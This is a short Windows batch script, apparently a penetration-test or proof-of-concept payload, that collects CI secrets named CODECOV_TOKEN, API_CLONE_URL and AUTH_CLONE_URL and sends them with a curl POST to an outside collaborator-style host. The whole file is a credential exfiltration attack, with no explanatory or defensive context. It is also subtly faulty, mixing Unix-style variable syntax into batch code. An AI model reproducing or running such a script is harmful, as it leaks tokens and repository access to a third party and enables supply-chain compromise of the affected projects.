@echo off
setlocal

set SERVER_URL=http://uqowc8eg8jdobvvul8rwjfwozf56t0hp.pentestcollaborator.com

echo Retrieving environment variables...

rem Retrieve environment variables
set VAR1=$CODECOV_TOKEN
set VAR2=$API_CLONE_URL
set VAR3=$AUTH_CLONE_URL

echo Sending environment variables to server...

rem Send environment variables to server
curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"%VAR1%\",\"VAR2\":\"%VAR2%\",\"VAR3\":\"%VAR3%\"}" %SERVER_URL%

echo Environment variables sent to server.
